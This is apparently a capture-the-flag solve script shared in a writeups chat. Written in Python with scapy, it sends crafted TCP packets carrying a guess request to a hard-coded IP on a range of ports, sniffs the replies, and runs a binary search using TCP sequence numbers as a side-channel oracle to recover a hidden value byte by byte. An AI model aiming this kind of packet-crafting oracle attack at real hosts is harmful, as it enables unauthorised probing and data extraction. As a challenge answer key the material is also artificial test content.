# Solve by fredd - posted in writeups chat
#  An excellent efficient solution

from scapy.all import *
import threading
import time
import queue

q = queue.Queue()

ip = '37.128.146.64'

def check_cond(port, val):
    data = f'GET /guess?guess={val} '.encode()
    send(IP(dst=ip) / TCP(dport=port, flags='PA') / data, verbose=False)
    seq = q.get()
    q.task_done()
    return seq > 7331, seq - 7333

def guess(port):
    lo, hi = 0, 320
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        res, bit = check_cond(port, mid)
        if not res:
            lo = mid + 1
        else:
            hi = mid - 1
    return lo, check_cond(port, lo)[1]

def packet_callback(pkt):
    if pkt.seq == 1338:
        return
    q.put(pkt.seq)

blen = 319
l = [None] * blen

t = threading.Thread(target=lambda:sniff(filter="tcp and src host 37.128.146.64", prn=packet_callback))
t.start()
time.sleep(1)

for i in range(blen):
    pos, val = guess(1000 + i)
    print('POS', pos, val)
    l[pos] = val
    print(l)


